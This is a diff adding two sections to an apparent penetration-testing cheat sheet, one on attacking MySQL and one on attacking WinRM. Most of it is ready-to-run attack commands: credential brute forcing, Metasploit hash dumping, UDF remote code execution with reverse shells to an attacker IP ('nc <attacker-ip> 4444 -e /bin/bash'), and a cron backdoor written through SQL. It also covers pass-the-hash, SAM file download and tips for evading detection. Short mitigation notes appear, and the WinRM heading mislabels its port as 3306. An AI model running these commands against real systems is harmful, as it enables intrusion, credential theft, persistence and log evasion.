@@ -1189,11 +1189,304 @@ exploit/multi/postgres/postgres_copy_from_program_cmd_exec
 
 exploit/windows/postgres/postgres_payload
 </details>
+<details>
+<summary>13. MYSQL Port 3306</summary>
+ <br>
+🔎 Step 1: Enumeration
+Start with identifying whether port 3306 (default MySQL port) is open:
 
+bash
 
+    nmap -p3306 -sV -sC <target-ip>
+Add aggressive scanning options for version detection and default script scans:
 
+bash
 
+    nmap -p3306 --script mysql* -sV <target-ip>
+This will also try:
 
+Default creds
 
+Enumerate MySQL users
 
+Check for anonymous access
+
+🔑 Step 2: Brute Forcing MySQL Credentials
+bash
+
+    hydra -L users.txt -P pass.txt <ip> mysql
+Alternatively, you can use medusa:
+
+bash
+
+    medusa -h <ip> -u root -P pass.txt -M mysql
+Or use ncrack (especially good for fast brute-forcing):
+
+bash
+
+    ncrack -p 3306 -U users.txt -P pass.txt <ip>
+🧠 Step 3: Manual Login (Once Valid Credentials Are Found)
+bash
+
+    mysql -h <ip> -u <user> -p
+Once logged in, you can:
+
+List databases: show databases;
+
+Use a DB: use mysql;
+
+Check users: select user, host, authentication_string from mysql.user;
+
+⚡ Step 4: Exploitation via Metasploit
+A. Run SQL Queries Directly
+bash
+
+    msfconsole -q
+    use auxiliary/admin/mysql/mysql_sql
+    set rhosts <target-ip>
+    set username <user>
+    set password <pass>
+    set sql show databases;
+    run
+B. Dump Password Hashes
+bash
+
+    use auxiliary/scanner/mysql/mysql_hashdump
+    set rhosts <target-ip>
+    set username <user>
+    set password <pass>
+    run
+C. Run Commands via UDF (User Defined Function) Injection (for RCE)
+bash
+
+    use exploit/windows/mysql/mysql_udf_payload
+    set rhosts <target-ip>
+    set username root
+    set password toor
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <attacker-ip>
+    set lport 4444
+    run
+✅ This exploit creates a custom function using a shared library (.dll or .so) and then calls it through SQL to gain RCE.
+
+🧪 Step 5: Manual RCE via User-Defined Functions (UDF)
+If file_priv is granted, you can:
+
+Upload a malicious .dll or .so UDF file.
+
+Register it with SQL:
+
+sql
+
+    CREATE FUNCTION do_system RETURNS integer SONAME 'lib_mysqludf_sys.so';
+    SELECT do_system('nc <attacker-ip> 4444 -e /bin/bash');
+On Windows:
+
+sql
+
+    SELECT do_system('powershell -c <reverse_shell_payload>');
+🪵 Step 6: Post Exploitation
+Dump user tables:
+
+sql
+
+    select user, password from mysql.user;
+Look for saved credentials or tokens in application databases
+
+Exfiltrate configuration files, secrets, keys
+
+🛡️ Detection & Mitigation
+Disable root login from remote IPs (bind-address=127.0.0.1 in my.cnf)
+
+Enforce strong passwords and remove default credentials
+
+Regularly audit MySQL users and their privileges
+
+Monitor for signs of brute-force (slow query logs, login failures)
+
+Consider enabling TLS encryption for connections
+
+Use MySQL roles to minimize privilege exposure
+
+🔁 Alternatives Tools for MySQL Pentesting
+Tool	Purpose
+sqlmap	Exploit SQL injection vulnerabilities
+mysql_enum (NSE Script)	MySQL database enumeration
+DBPwAudit	Fast credential bruteforcer
+mariadb-client	Compatible client for login and testing
+Metasploit	Multiple auxiliary and exploit modules
+
+🧷 Additional Notes
+MySQL with misconfigured permissions (e.g., file_priv, secure_file_priv) allows file upload or command execution
+
+Some versions allow writing to crontab via SELECT ... INTO OUTFILE if not locked down
+
+sql
+
+    SELECT '*/1 * * * * root nc <ip> 4444 -e /bin/bash' INTO OUTFILE '/etc/cron.d/mysqlbackdoor';
+
+</details>
+
+<details>
+<summary>14. WinRM 3306</summary>
+ <br>
+📌 What is WinRM?
+Windows Remote Management (WinRM) is Microsoft’s implementation of the WS-Management protocol based on SOAP. It allows remote management of Windows systems and is enabled by default in some environments.
+
+Port 5985 → WinRM over HTTP (unencrypted unless message-level encryption is used)
+
+Port 5986 → WinRM over HTTPS (encrypted)
+
+🔎 Initial Enumeration
+Check if WinRM is exposed:
+
+bash
+
+    nmap -p 5985,5986 -sV -Pn <target-ip> --script http-winrm*
+Use nmap with WinRM-specific NSE scripts:
+
+bash
+
+    nmap -p5985 --script=winrm-auth <target-ip>
+Or check manually using curl:
+
+bash
+
+    curl -s -X POST http://<ip>:5985/wsman
+If the response contains wsman, the service is alive.
+
+🧪 Metasploit Enumeration
+Check for Supported Auth Methods:
+bash
+
+    msfconsole
+    use auxiliary/scanner/winrm/winrm_auth_methods
+    set RHOSTS <target-ip>
+    run
+🔐 Brute-Force WinRM Credentials
+1. Metasploit Module
+bash
+
+       use auxiliary/scanner/winrm/winrm_login
+       set RHOSTS <target-ip>
+       set user_file users.txt
+       set pass_file passwords.txt
+       set DOMAIN WORKSTATION
+       run
+2. Password Spray with nxc (lightweight & fast):
+bash
+
+       nxc winrm <ip> -u users.txt -p passwords.txt
+🧠 Remote Shell with Valid Credentials
+1. evil-winrm (Preferred Tool)
+bash
+
+       evil-winrm -i <target-ip> -u <user> -p <password>
+Supports:
+
+Upload/download
+Powershell scripting
+Proxy support
+Kerberos & pass-the-hash (see below)
+
+2. Docker Evil-WinRM (for Linux users)
+bash
+
+       docker run -it --rm --name evil-winrm --entrypoint evil-winrm oscarakaelvis/evil-winrm -i <ip> -u <user> -p <password>
+🧪 Alternative Shells
+1. PowerShell Remoting (Linux to Windows)
+Using PowerShell NTLM Docker:
+
+bash
+
+    docker run -it quickbreach/powershell-ntlm
+    $creds = Get-Credential
+    Enter-PSSession -ComputerName <ip> -Authentication Negotiate -Credential $creds
+2. Ruby WinRM Shell Script
+Download & configure this Ruby script:
+
+bash
+
+    wget https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb
+    nano winrm_shell_with_upload.rb  # Set IP, creds
+    ruby winrm_shell_with_upload.rb
+3. Powershell Empire / Covenant
+You can use tools like:
+
+Empire
+
+Covenant
+
+PSSharp
+To execute WinRM-based agents if lateral movement or persistent C2 is required.
+
+🧯 Pass-the-Hash with Evil-WinRM
+If you have an NTLM hash, use:
+
+bash
+
+    evil-winrm -i <target-ip> -u <user> -H <NTLM_hash>
+Or use Impacket's wmiexec.py or psexec.py as alternatives.
+
+🔁 Lateral Movement
+If you compromise a user with WinRM access on other systems:
+
+bash
+
+    evil-winrm -i <target-2> -u compromised_user -p password
+Or use built-in PS remoting:
+
+powershell
+
+    Invoke-Command -ComputerName target2 -ScriptBlock { whoami } -Credential (Get-Credential)
+📤 Post Exploitation with Evil-WinRM
+bash
+
+    upload <local-file> C:\Users\Public\payload.exe
+    download C:\Windows\System32\config\SAM
+    scripts
+Built-in modules:
+
+BloodHound
+PowerView
+SharpHound
+PowerUp
+
+🕵️ Detection Evasion Tips
+Avoid brute-force from same IP: use --proxy or TOR routing
+
+Disable PowerShell logging where possible
+
+Modify Evil-WinRM user-agent string if using HTTPS
+
+Consider using Kerberos authentication to reduce logs (with --auth kerberos)
+
+🛡️ Defensive Notes / Mitigations
+Disable WinRM if not needed:
+
+powershell
+
+    Disable-PSRemoting -Force
+Use HTTPS + Cert-based Auth if enabled
+
+Enable logging (Microsoft-Windows-WinRM/Operational)
+
+Use GPO to restrict which users can access via WinRM
+
+Monitor for new evil-winrm.exe or PS remoting activity
+
+Limit "Remote Management Users" group
+
+🧰 Related Tools Summary
+Tool	Use
+evil-winrm	Remote PS shell
+nxc	Fast password spray
+crackmapexec	SMB/WinRM enumeration
+PSRemoting	Native method
+Impacket	Pass-the-hash over WinRM (via SMB/WMI/PSEXEC)
+wmiexec.py	WMI exec using hashes
+pywinrm	Python-based WinRM library
+Metasploit	Brute-force, auth check
+
+</details>
   
